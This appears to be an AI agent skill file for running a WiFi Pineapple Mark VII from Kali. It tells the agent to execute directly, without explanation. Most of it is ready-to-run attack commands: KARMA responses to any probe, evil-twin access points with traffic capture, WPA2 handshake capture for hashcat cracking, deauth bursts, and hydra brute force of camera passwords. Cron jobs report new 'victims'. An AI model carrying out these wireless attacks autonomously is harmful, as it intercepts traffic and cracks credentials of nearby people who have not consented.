---
name: pineapple
description: "Hak5 WiFi Pineapple Mark VII — SSH access, UCI configuration, WiFi reconnaissance, evil twin deployment (open + WPA2 handshake capture), PineAP persistent mode, traffic capture, dashboard restoration, cron-based alerting, and IoT device recon."
version: 1.2.0
platforms: [linux]
metadata:
  hermes:
    tags: [wireless, pineapple, wifi, monitor-mode, packet-capture, ssh, scp, recon, evil-twin, pineap, handshake, uci, red-teaming, cron, monitoring, iot, rtsp, alarmdotcom]
    related_skills: [kali-tool-audit]
---

# WiFi Pineapple Mark VII

**User Execution Preference (Critical):**  
Mr. Wong strongly prefers **direct execution and results** over step-by-step commands or methodological explanations. When asked to check status, run monitoring, or perform any Pineapple operation, execute the necessary commands and deliver concrete outputs/findings immediately. Do not provide instructions unless explicitly requested.

The Pineapple is permanently connected to Kali via USB passthrough (VirtualBox). It shows up as `eth1` on Kali.

## Connection Details

| | Value |
|---|---|
| Primary access path | Tailscale VPN |
| Tailscale hostname | `pineapple-mk7` |
| Tailscale IP | `100.81.127.115` |
| Legacy/local USB IP | `172.16.42.1` (do not rely on this for cron jobs) |
| SSH user | `root` |
| SSH key | `/root/.ssh/id_ed25519` |
| SSH shortcut | `pineapple` (configured in `~/.ssh/config`, currently resolves to `100.81.127.115`) |
| Web UI | `http://100.81.127.115:1471` over Tailscale |
| Pineapple radios | `wlan1` = 2.4GHz recon/monitor, `wlan2` = client uplink |

## SSH Access

Utility script: `scripts/reset-asix-usb-nic.sh` performs the least-disruptive Kali-side ASIX USB NIC unbind/rebind cleanup when the Pineapple link leaves a cosmetic D-state kernel worker.

```bash
# Using shortcut (preferred)
ssh pineapple

# Explicit form
ssh -i /root/.ssh/id_ed25519 root@172.16.42.1
```

## Bidirectional File Transfer

```bash
# Kali → Pineapple
scp /path/to/file pineapple:/tmp/

# Pineapple → Kali
scp pineapple:/tmp/capture.pcap /root/captures/

# Recursive directory transfer
scp -r pineapple:/root/loot/ /root/loot/

# Large captures with compression
ssh pineapple "gzip -c /tmp/capture.pcap" > /root/captures/capture.pcap.gz
```

## Monitor Mode & Packet Capture

```bash
# Enable monitor mode on wlan1
ssh pineapple "airmon-ng check kill && airmon-ng start wlan1"

# Pipe live capture to Wireshark on Kali
ssh pineapple "tcpdump -i wlan1mon -w -" | wireshark -k -i -

# Save capture on Pineapple, then pull to Kali
ssh pineapple "airodump-ng wlan1mon -w /tmp/scan --output-format pcap"
scp pineapple:/tmp/scan-01.cap /root/captures/

# Target specific channel and BSSID
ssh pineapple "airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/target wlan1mon"

# Stop monitor mode
ssh pineapple "airmon-ng stop wlan1mon"
```

## Web UI Access from Windows (SSH Tunnel)

Run on Windows — opens http://localhost:1471:

```powershell
ssh -i "$env:USERPROFILE\.ssh\kali_docker" -L 1471:172.16.42.1:1471 -N root@192.168.2.184
```

A desktop shortcut (`Pineapple UI.lnk`) and script (`pineapple-ui.ps1`) already exist on the Windows machine for this.

## PineAP — Active Engagement

### Method A: UCI Config (Recommended — No Auth Needed)

The PineAP daemon (`pineapd`) is configured via UCI at `pineap.@config[0]`. This is simpler than the API and doesn't require authentication tokens.

```bash
# Enable all PineAP features for persistent evil twin operation
ssh pineapple '
uci set pineap.@config[0].karma="on"
uci set pineap.@config[0].beacon_responses="on"
uci set pineap.@config[0].capture_ssids="on"
uci set pineap.@config[0].logging="on"
uci set pineap.@config[0].broadcast_ssid_pool="on"
uci commit pineap
/etc/init.d/pineapd restart
'

# Check current PineAP state
ssh pineapple 'uci show pineap.@config[0] | grep -E "karma|beacon|capture|logging|broadcast"'
```

| Setting | Effect |
|---------|--------|
| `karma` | Responds to ANY probe request automatically |
| `beacon_responses` | Sends beacons matching probed SSIDs (evil twin) |
| `capture_ssids` | Logs all probed SSIDs to `/etc/pineapple/pineapple.db` |
| `logging` | Full activity log |
| `broadcast_ssid_pool` | Multi-SSID beacon flood from captured SSIDs |
| `broadcast_ssid_pool_random` | Randomizes the pool broadcast order |

Captured handshakes go to `/root/handshakes/`.

### Method B: API (Requires Auth Token)

```bash
TOKEN=$(curl -s -X POST http://172.16.42.1:1471/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"root","password":"<password>"}' | jq -r '.token')

curl -s -X POST "http://172.16.42.1:1471/api/pineap/enable" \
  -H "Authorization: Bearer $TOKEN"
```

## WiFi Reconnaissance

Full channel-hopping sweep to discover APs and probe requests:

```bash
# 25-second sweep — saves to CSV on Pineapple
ssh pineapple '
airodump-ng wlan1 --band abg -w /tmp/wscan --output-format csv &
sleep 25
kill %1 2>/dev/null
cat /tmp/wscan-01.csv
'

# Parse APs from CSV (run locally after pulling the file)
grep -E "^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:" /tmp/wscan-01.csv | grep -v "Station MAC" | awk -F, '{print $1, $14, $6, $5}'

# Parse probe requests (evil twin targets)
grep "Probed ESSIDs" /tmp/wscan-01.csv | awk -F, '{print $1, $7}'
```

**Pitfall:** The Pineapple does NOT have the `timeout` command. Use `& sleep N; kill %1` instead.

## Evil Twin — Two-Phase Approach

The user prefers: **try open evil twin first → if no bites, switch to WPA2 handshake capture.**

### Phase 1: Open Evil Twin (via UCI SSID change)

```bash
ssh pineapple '
# Change the management AP to evil twin SSID
uci set wireless.@wifi-iface[0].ssid="TargetSSID"
uci set wireless.@wifi-iface[0].hidden="0"
uci set wireless.@wifi-iface[0].encryption="none"
uci commit wireless
wifi reload

# Add second SSID if needed (enable disabled virtual AP)
uci set wireless.@wifi-iface[1].ssid="SecondTarget"
uci set wireless.@wifi-iface[1].encryption="none"
uci set wireless.@wifi-iface[1].disabled="0"
uci commit wireless
wifi reload

# Set up NAT from br-lan to wlan2 for internet passthrough
iptables -t nat -A POSTROUTING -o wlan2 -j MASQUERADE
iptables -A FORWARD -i br-lan -o wlan2 -j ACCEPT

# Start traffic capture on bridge
tcpdump -i br-lan -w /tmp/caps/evil-twin.pcap -G 300 -W 12 -s 0 \
  -nn not host 172.16.42.42 and not port 22 &
'
```

**Pitfall:** WPA2 devices will NOT auto-connect to an OPEN AP with the same SSID. Their saved profile says `WPA2-PSK` and they enforce the security match. Phase 1 only works if the original network was open or the device has misconfigured profiles. If no devices connect within 15-20 minutes, move to Phase 2.

### Phase 2: Passive WPA2 Handshake Capture

Don't deploy an evil twin at all. Just listen passively for devices reconnecting to the real AP:

```bash
ssh pineapple '
mkdir -p /tmp/handshakes
airodump-ng wlan1 --band abg -w /tmp/handshakes/capture --output-format pcap &
'
```

When a device reconnects to the real AP, the EAPOL 4-way handshake is captured. Extract and crack offline with `hashcat -m 22000`.

### Restoring After Evil Twin

**CRITICAL:** Manual wlan0 config changes break the dashboard. wlan0 MUST stay in the br-lan bridge. Always restore after an evil twin session:

```bash
ssh pineapple '
# Restore original AP
uci set wireless.@wifi-iface[0].ssid="linksys"
uci set wireless.@wifi-iface[0].hidden="1"
uci set wireless.@wifi-iface[0].encryption="none"
uci set wireless.@wifi-iface[1].disabled="1"  # disable extra SSID
uci commit wireless

# Clean iptables
iptables -t nat -F POSTROUTING
iptables -F FORWARD

# Kill our processes
killall tcpdump airodump-ng hostapd 2>/dev/null

# Reload wireless and restart dashboard
wifi reload
/etc/init.d/pineapple restart
'
```

Dashboard returns at `172.16.42.1:1471` within 5 seconds.

## Persistent Monitoring & Alerting (Cron)

After PineAP is enabled, set up automated alerting from Kali so new victims and attacks are reported to Telegram without manual dashboard checking. Two scripts handle this:

- `scripts/pineapple-monitor.sh` — polls Pineapple for new DHCP leases, WPA handshakes, captured SSIDs, and associated clients. Diff-based: only reports new findings. State tracked in `/root/.pineapple_state`.
- `scripts/ghossein-defense.sh` — detects attacks against home network: deauth floods (>10 frames/15s), rogue APs spoofing Ghossein, WPS brute force (>5 attempts), new unknown APs appearing, Pineapple uplink drops.
- `references/cron-status-checks.md` — quick runbook for verifying Hermes Pineapple cron jobs, diagnosing `last_status=error` vs silent no-event runs, and reporting concise status to Mr. Wong.

Wrap in a cron job that runs every 5 minutes, delivering to origin only when output exists (silent otherwise). The cron agent is independent — runs even when not actively chatting.

**Delivery Preference — Silent Monitoring, Active Status Checks**  
For Pineapple Client Alerts and perimeter monitoring, Mr. Wong prefers **silent recurring jobs**: no heartbeat/status-only Telegram spam. Jobs should emit/deliver only when a real client/victim/SSID/handshake/perimeter event appears. When he asks “are the Pineapple jobs running?”, actively check cron/job state, recent run status, scripts, and Pineapple reachability, then return a concise status summary with last/next run and any blocker. Do not convert recurring alert jobs into heartbeat jobs unless he explicitly asks for continuous liveness messages.

## IoT Device Reconnaissance

For cameras/IoT devices discovered during WiFi survey, use the techniques in `references/iot-device-recon.md`: RTSP camera probing (OPTIONS → DESCRIBE → brute force), MAC OUI lookup for manufacturer ID, UPnP device description queries, Alarm.com hub fingerprinting (MAC OUI `50:40:74`, ports 554/6443/40928).

## Perimeter Monitoring

Dedicated perimeter intrusion detection system using separate scripts (do **not** modify existing `pineapple_monitor.sh` or `ghossein_defense.sh`).

### Core Components (v3+)
- `perimeter_whitelist.sh` — Maintains known home devices (Ghossein APs + personal devices). Prevents false positives.
- `perimeter_monitor.sh` — Main detector with:
  - Dual-band scanning (2.4 GHz + 5 GHz channel hopping)
  - Enhanced passive fingerprinting via `airodump-ng` + `tcpdump` management frame capture
  - Light active recon (short targeted deauth bursts to encourage quiet devices to probe)
  - Specific monitoring for probes targeting home/cameras (`Ghossein`, `TELUS`, `Alarm`, `SmartHome`, `RTSP`, etc.)
  - Device type guessing (Apple Phone, Samsung, IoT/ESP32, Intel Laptop, etc.)
  - State tracking + 48h deduplication

### Workflow
1. Initialize whitelist: `/root/perimeter_whitelist.sh auto`
2. Add personal devices: `/root/perimeter_whitelist.sh add MAC "Device Name"`
3. Test manually: `/root/perimeter_monitor.sh`
4. Deploy via cron (separate job, every 10m, origin delivery only on alerts)

### Key Patterns
- Always run whitelist check **before** alerting.
- Combine passive (longer airodump + tcpdump) + light active (deauth on common channels).
- Prioritize probes for home/cameras in output.
- User prefers **direct execution and results** — when asked to build or improve monitoring, deliver working scripts + test output, not step-by-step explanations.

1. **Dashboard breaks after manual wlan0 changes** — wlan0 MUST stay in the `br-lan` bridge. Never `ip link set wlan0 nomaster`. Always use UCI, not raw `hostapd`/`ip` commands.
2. **`timeout` doesn't exist on Pineapple** — BusyBox doesn't include it. Use `& sleep N; kill %1` pattern.
3. **No WiFi from Kali VM** — VirtualBox doesn't virtualize WiFi adapters. All scanning MUST run on the Pineapple.
4. **dnsmasq is auto-managed** — OpenWRT's netifd handles DHCP on br-lan. Don't try to start/stop it manually.
5. **Open evil twin fails for WPA2 targets** — Devices won't downgrade from WPA2 to OPEN. Phase 1 is a "might work" shot. Phase 2 (passive handshake capture) is the reliable approach.
6. **`airmon-ng stop wlan1mon` can orphan wlan1** — If monitor interface gets stuck, `iw wlan1mon del` then re-create.
7. **ASIX USB Ethernet kworker cosmetic hangs** — The Pineapple USB NIC can leave a Kali kernel worker in D-state around `usb_start_wait_urb` / `asix_check_host_enable` while the Pineapple still works. Verify with `ps -p <pid> -o pid,stat,etime,wchan:40,comm` and `/proc/<pid>/stack`. If it is only the ASIX PHY-status worker and Pineapple ping/SSH still work, the clean cosmetic fix is a least-disruptive driver rebind: identify the binding (`/sys/bus/usb/drivers/asix/1-2:1.0` in this setup), then `echo 1-2:1.0 > /sys/bus/usb/drivers/asix/unbind; sleep 3; echo 1-2:1.0 > /sys/bus/usb/drivers/asix/bind`; bring the interface back up/DHCP if needed and verify ping/SSH/dashboard/PineAP. Do not reboot or power-cycle first unless rebind fails.
8. **UCI shows WiFi password in cleartext** — `uci show wireless.@wifi-iface[5].key` exposes the uplink WiFi password. Never include this in shared output.
8. **PineAP daemon controls wlan1** — If `wifi reload` or manual commands break wlan1, restart pineapd: `/etc/init.d/pineapd restart`.
9. **Evil twin channel must match target** — Check the target AP's channel in airodump and set your evil twin to the same channel for maximum catch rate.
10. **Hydra RTSP Digest brute force is extremely slow** — RTSP Digest auth requires per-attempt challenge-response calculation. Hydra manages ~4-16 attempts/second with 4 threads. A 10k wordlist can take hours. For camera password cracking, try manual testing of ISP default patterns first, then fall back to hydra only if needed.
11. **False positives when services return 200 for everything** — Some services (e.g., "Service not available" on port 9000) return HTTP 200 regardless of credentials. Hydra's http-get module interprets any 200 as success. Verify manually with `curl -u test:test` before trusting hydra results.
12. **Alarm.com hub UPnP returns 401 for all credentials** — The XML 401 page starts with `<?xml version="1.0"` which can fool grep-based "success" checks. Always check for `<title>401` in the response body, not just absence of "401" in line 1.

## Notes

- Management AP (`wlan0`) IS enabled — broadcasts hidden "linksys" SSID on channel 11, open auth, bridged to eth0. This is how the dashboard is accessed.
- The AP is hidden (`hidden=1`) so it doesn't appear in normal WiFi scans, but devices can still connect if they know the SSID.
- PineAP uses `wlan1mon` as the monitor/capture interface.
- wlan2 is reserved for wireless client uplink (internet via home router — `Ghossein` in this environment).
- If eth1 has no IP after reboot: `ifup eth1` (static config in `/etc/network/interfaces`).
- USB passthrough filter is permanent in VirtualBox — Pineapple auto-attaches to Kali on every plug.
- SSID filter is Deny List — own networks are protected from harvesting.
- **uci commands are preferred over raw config file edits** — OpenWRT's netifd auto-applies UCI changes.
- The Pineapple dashboard (`/etc/init.d/pineapple`) is separate from the PineAP daemon (`/etc/init.d/pineapd`). Restarting one doesn't affect the other.
